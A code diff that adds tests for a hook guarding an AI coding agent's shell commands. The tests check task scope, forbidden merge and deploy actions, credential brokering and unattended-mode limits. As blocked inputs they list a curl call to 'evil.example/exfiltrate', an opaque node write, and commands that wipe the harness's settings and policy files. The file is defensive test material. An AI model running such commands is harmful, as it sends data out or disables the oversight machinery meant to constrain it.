@@ -10,6 +10,20 @@ function bash(projectDir, command, env) {
   return runHook(projectDir, HOOK, { tool_name: 'Bash', tool_input: { command } }, env);
 }
 
+function writeTaskEnvelope(projectDir, allowedPaths, forbiddenActions) {
+  const { stampEnvelope } = require('../.claude/hooks/lib/task-envelope');
+  fs.writeFileSync(path.join(projectDir, '.claude', 'state', 'task-envelope.json'), JSON.stringify(stampEnvelope({
+    schema_version: 1,
+    task_id: 'TASK-1',
+    risk_tier: 'R2',
+    allowed_paths: allowedPaths,
+    forbidden_actions: forbiddenActions,
+    required_evidence: ['unit'],
+    required_approvals: 1,
+    budgets: { dimensions: [{ unit: 'agents', limit: 10 }] },
+  })));
+}
+
 // --- scope ---
 
 test('blocks a bash redirection that writes outside the project', async () => {
@@ -34,6 +48,56 @@ test('allows read-only commands', async () => {
   }
 });
 
+test('task envelope blocks forbidden semantic actions', async () => {
+  const projectDir = makeHookProject([HOOK]);
+  writeTaskEnvelope(projectDir, ['src/**'], ['merge', 'deploy']);
+  const merge = await bash(projectDir, 'gh pr merge 12');
+  assert.strictEqual(merge.status, 2, merge.stdout);
+  assert.match(merge.stdout, /lacks external authority/);
+  const testRun = await bash(projectDir, 'npm test');
+  assert.strictEqual(testRun.status, 0, testRun.stdout);
+});
+
+test('task envelope applies allowed paths to Bash write targets', async () => {
+  const projectDir = makeHookProject([HOOK]);
+  writeTaskEnvelope(projectDir, ['src/approved/**'], []);
+  const allowed = await bash(projectDir, 'echo ok > src/approved/a.txt');
+  assert.strictEqual(allowed.status, 0, allowed.stdout);
+  const blocked = await bash(projectDir, 'echo no > src/other/a.txt');
+  assert.strictEqual(blocked.status, 2, blocked.stdout);
+  assert.match(blocked.stdout, /outside task TASK-1/);
+});
+
+test('unattended mode routes credentialed commands to the external broker', async () => {
+  const projectDir = makeHookProject([HOOK]);
+  writeTaskEnvelope(projectDir, ['src/**'], []);
+  fs.writeFileSync(path.join(projectDir, '.claude', 'unattended-policy.json'), JSON.stringify({
+    broker_only_commands: ['gh', 'aws'],
+  }));
+  const result = await bash(projectDir, 'gh api /user', { HARNESS_UNATTENDED: '1' });
+  assert.strictEqual(result.status, 2, result.stdout);
+  assert.match(result.stdout, /broker-only/);
+});
+
+test('unattended mode blocks opaque shells, unapproved egress, and dependency installation', async () => {
+  const projectDir = makeHookProject([HOOK]);
+  writeTaskEnvelope(projectDir, ['src/**'], []);
+  fs.writeFileSync(path.join(projectDir, '.claude', 'unattended-policy.json'), JSON.stringify({
+    allow_package_install: false,
+    broker_only_commands: ['gh', 'aws'],
+    network: { default: 'deny', allowed_domains: ['registry.npmjs.org'] },
+  }));
+  for (const command of [
+    'node -e "require(\'fs\').writeFileSync(\'src/pwned\', \'1\')"',
+    'curl https://evil.example/exfiltrate',
+    'npm install left-pad',
+  ]) {
+    const result = await bash(projectDir, command, { HARNESS_UNATTENDED: '1' });
+    assert.strictEqual(result.status, 2, `${command}: ${result.stdout}`);
+    assert.match(result.stdout, /runtime policy/i);
+  }
+});
+
 test('allows /dev/null and other device sinks (the 2>/dev/null idiom)', async () => {
   const projectDir = makeHookProject([HOOK]);
   for (const cmd of [
@@ -53,7 +117,10 @@ const MACHINERY_WRITES = [
   'tee .claude/git-hooks/pre-commit < /dev/null',
   "sed -i 's/.*/return;/' .claude/hooks/lib/tdd.js",
   'cp /dev/null .claude/settings.json',
+  'cp /dev/null .claude/settings.auto.json',
   'echo 100 > .claude/state/coverage-baseline.txt',
+  'echo "{}" > .claude/config/autonomy-policy.json',
+  'echo "{}" > .claude/state/autonomy-policy.json',
 ];
 
 test('blocks bash writes to harness machinery in a target project', async () => {
